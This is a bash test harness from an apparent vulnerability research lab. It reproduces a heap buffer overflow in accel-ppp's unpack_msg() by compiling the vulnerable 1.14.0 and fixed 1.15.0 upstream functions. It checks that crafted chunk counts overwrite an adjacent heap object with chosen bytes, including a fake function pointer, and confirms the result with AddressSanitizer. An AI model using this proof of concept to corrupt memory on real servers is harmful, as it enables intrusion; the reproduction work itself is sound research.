#!/usr/bin/env bash
# Replay driver: bash lab/frontier/accelppp2shell/run.sh <outdir>
# Extracts the VERBATIM unpack_msg() from pinned upstream log_tcp.c at tags
# 1.14.0 (vulnerable) and 1.15.0 (fixed), plus log_unpack_msg() from the fixed
# log.c, pads leading lines to preserve upstream line numbers, and compiles
# each against one driver. No production function is reimplemented.
set -u

here=$(cd "$(dirname "$0")" && pwd)
out=${1:-out}
mkdir -p "$out"
out=$(cd "$out" && pwd)

fail=0
pass() { printf 'PASS %s\n' "$1"; }
bad()  { printf 'FAIL %s\n' "$1"; fail=1; }
need() { if grep -qF -- "$2" "$1"; then pass "$3"; else bad "$3"; fi; }
neednot() { if grep -qF -- "$2" "$1"; then bad "$3"; else pass "$3"; fi; }

# --- pinned source bytes (fetched from the tags recorded in PROVENANCE.md) ---
cat >"$out/pinned.sha256" <<'EOF'
022d9890a579b15aad5d8d68349d364673d2a874ac4908f09494aea5c2a3a0b4  log.h.1.14.0
2ddbf3ffc5a942ccfd4c13f560209d6b3880aa82ebe2b0e69e763595b9da1ef0  log.c.1.14.0
449eb3ef08cc09176b0dfeb24170288fbcf738e8ff247ce25a4b8076fd78f7d7  log_tcp.c.1.14.0
674023ce56784bae5c24c9f374f21372e98348f8f9bed73aa75fa78ac04404f7  log_syslog.c.1.14.0
7c6e8d85802ce4033ac05abf777e2202a93ce0cddb5107757d516df67102f88a  log_pgsql.c.1.14.0
eff7bd26bba2d1ac7a4fb4a78aa56cc287ecf2f343e0b5b1ee7b8180e05d19b1  log.h.1.15.0
f105aeed510b8a7699606337d10e067af06b7b12d03e20d931d1260c4474e6f7  log.c.1.15.0
f21a1191f87d6c38079eafac199edb96c29f6592fa33f9934f6cf6f9e94124b7  log_tcp.c.1.15.0
044c7abacc18990983cac9a8b12ad22be248558d186102dd0312cf28719e563e  log_syslog.c.1.15.0
6bab117571c30261c991f1757b76a8990a74c87630ab1793702b2bb0d706315f  log_pgsql.c.1.15.0
02c2ff3a9306203d1d72365b5c907d3f4a5faf0e0944e59304fcb9b3404f32c4  fix-58e3994.patch
EOF
if (cd "$here/src" && sha256sum -c "$out/pinned.sha256" >"$out/pinned.check" 2>&1); then
	pass PINNED_SOURCE_HASHES
else
	bad PINNED_SOURCE_HASHES
	cat "$out/pinned.check"
fi

# --- verbatim extraction, line numbers preserved ---
extract_fn() {
	src=$1 sig=$2 dest=$3
	line=$(grep -nF -- "$sig" "$src" | cut -d: -f1)
	if [ -z "$line" ]; then printf 'FAIL EXTRACT_MISSING %s\n' "$sig"; fail=1; return; fi
	{
		for ((i = 1; i < line; i++)); do printf '\n'; done
		awk -v start="$line" 'NR >= start { print } NR > start && /^}/ { exit }' "$src"
	} >"$dest"
}
extract_fn "$here/src/log_tcp.c.1.14.0" 'static void unpack_msg' "$out/log_tcp.c.1.14.0"
extract_fn "$here/src/log_tcp.c.1.15.0" 'static void unpack_msg' "$out/log_tcp.c.1.15.0"
extract_fn "$here/src/log.c.1.15.0" 'int __export log_unpack_msg' "$out/log.c.1.15.0"

need "$out/log_tcp.c.1.14.0" 'memcpy(t->buf + pos, chunk->msg, chunk->len)' EXTRACT_VULN_FN
need "$out/log_tcp.c.1.14.0" 'list_for_each_entry(chunk, msg->chunks, entry)' EXTRACT_VULN_LOOP
need "$out/log_tcp.c.1.15.0" 'pos += log_unpack_msg(msg, t->buf + pos, BUF_SIZE - pos)' EXTRACT_FIXED_FN
need "$out/log.c.1.15.0" 'len = min(chunk->len, size - pos)' EXTRACT_FIXED_HELPER
if [ "$(grep -nF 'memcpy(t->buf + pos, chunk->msg, chunk->len)' "$out/log_tcp.c.1.14.0" | cut -d: -f1)" = "63" ]; then
	pass UPSTREAM_LINE_NUMBER_63
else
	bad UPSTREAM_LINE_NUMBER_63
fi

# --- compile real pinned functions, three modes ---
CFLAGS='-std=gnu11 -O0 -g -Wall -Wextra -Dstatic= -include '"$here/stub.h"
gcc $CFLAGS -o "$out/vuln" "$here/driver.c" -x c "$out/log_tcp.c.1.14.0" || exit 91
gcc $CFLAGS -fsanitize=address -o "$out/asan" "$here/driver.c" -x c "$out/log_tcp.c.1.14.0" || exit 92
gcc $CFLAGS -DFIXED_MODE -o "$out/fixed" "$here/driver.c" -x c "$out/log.c.1.15.0" -x c "$out/log_tcp.c.1.15.0" || exit 93
pass COMPILE

# --- rung 1/2: plain build. 66 AVP chunks of 64 bytes plus a 30-byte header
# overflow the 4160-byte heap buffer by 94 bytes; chosen bytes land in the
# adjacent heap object. ---
"$out/vuln" vuln >"$out/vuln.out" 2>&1
vrc=$?
if [ "$vrc" -eq 0 ]; then pass VULN_RC0; else bad VULN_RC0; fi
need "$out/vuln.out" 'VICTIM first_changed=0 chosen_offset=4 chosen_bytes=1122334455667788' RUNG2_CHOSEN_BYTES_READBACK
need "$out/vuln.out" 'CHOSEN marker=55465450 fn=0x1122334455667788' RUNG4_CHOSEN_VALUES_SUPPLIED

# --- rung 3: ASan-confirmed heap corruption in the REAL upstream function ---
ASAN_OPTIONS=detect_leaks=0:abort_on_error=0 "$out/asan" asan >"$out/asan.out" 2>&1
arc=$?
if [ "$arc" -ne 0 ]; then pass ASAN_NONZERO_RC; else bad ASAN_NONZERO_RC; fi
need "$out/asan.out" 'heap-buffer-overflow' ASAN_HEAP_OVERFLOW
need "$out/asan.out" 'WRITE of size' ASAN_WRITE_SIZE
need "$out/asan.out" 'unpack_msg' ASAN_UPSTREAM_FRAME
need "$out/asan.out" 'log_tcp.c.1.14.0:63' ASAN_UPSTREAM_CALL_SITE
need "$out/asan.out" 'CHOSEN marker=55465450 fn=0x1122334455667788' RUNG4_CHOSEN_VALUES_SUPPLIED_ASAN

# --- fixed control: 1.15.0 bounds the unpack to BUF_SIZE ---
"$out/fixed" fixed >"$out/fixed.out" 2>&1
frc=$?
if [ "$frc" -eq 0 ]; then pass FIXED_RC0; else bad FIXED_RC0; fi
need "$out/fixed.out" 'AFTER pos=4160 buf_size=4160' FIXED_BOUNDED_POS
need "$out/fixed.out" 'VICTIM first_changed=-1 chosen_offset=4 chosen_bytes=0000000000000000' FIXED_NEIGHBOUR_CLEAN

# --- deterministic trace (excludes ASan variable text) ---
{
	grep -E '^(RUN |GEO |CHOSEN |AFTER |VICTIM |DONE )' "$out/vuln.out" || true
	echo 'ASAN_CLASS=heap-buffer-overflow'
	grep -E '^(RUN |GEO |CHOSEN |AFTER |VICTIM |DONE )' "$out/fixed.out" || true
} >"$out/trace.txt"
sha256sum "$out/trace.txt" | cut -d' ' -f1 >"$out/trace.sha256"
printf 'sha256=%s\n' "$(cat "$out/trace.sha256")"

if [ "$fail" -eq 0 ]; then
	echo 'ALL CHECKS PASS rc 0'
	exit 0
fi
echo 'SOME CHECKS FAILED rc 1'
exit 1
